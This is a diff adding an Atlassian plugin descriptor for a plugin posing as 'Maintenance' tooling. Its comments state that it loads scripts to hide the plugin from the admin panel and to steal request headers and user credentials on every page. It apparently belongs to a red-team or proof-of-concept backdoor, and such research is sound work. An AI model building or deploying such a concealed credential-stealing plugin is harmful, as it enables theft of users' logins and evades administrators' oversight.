@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<atlassian-plugin key="${atlassian.plugin.key}" name="${project.name}" plugins-version="2"> 
+  <plugin-info> 
+    <description>${project.description}</description>  
+    <version>${project.version}</version>  
+    <vendor name="${project.organization.name}" url="${project.organization.url}"/>
+    <param name="plugin-icon">images/cyllective-logo.jpg</param>
+    <param name="plugin-logo">images/cyllective-logo.jpg</param>
+  </plugin-info>
+
+  <!-- The REST API exposing the "Maintenance" features -->
+  <rest name="Maintenance REST API" key="maintenance-rest-api" path="/maintenance" version="1.0">
+  </rest>
+
+  <!-- The JS to hide the plugin in the admin panel -->
+  <web-resource name="Hide Plugins" key="hide-plugins">
+    <resource type="download" name="hide-plugins.js" location="/js/hide-plugins.js"/>
+    <context>atl.admin</context>
+  </web-resource>
+
+  <!-- The JS for stealing headers -->
+  <web-resource name="Send Headers" key="send-headers">
+    <resource type="download" name="send-headers.js" location="/js/send-headers.js"/>
+    <context>atl.general</context>
+  </web-resource>
+
+    <!-- The JS for stealing credentials -->
+  <web-resource name="Send Creds" key="send-creds">
+    <resource type="download" name="send-creds.js" location="/js/send-creds.js"/>
+    <context>atl.general</context>
+  </web-resource>
+
+</atlassian-plugin>
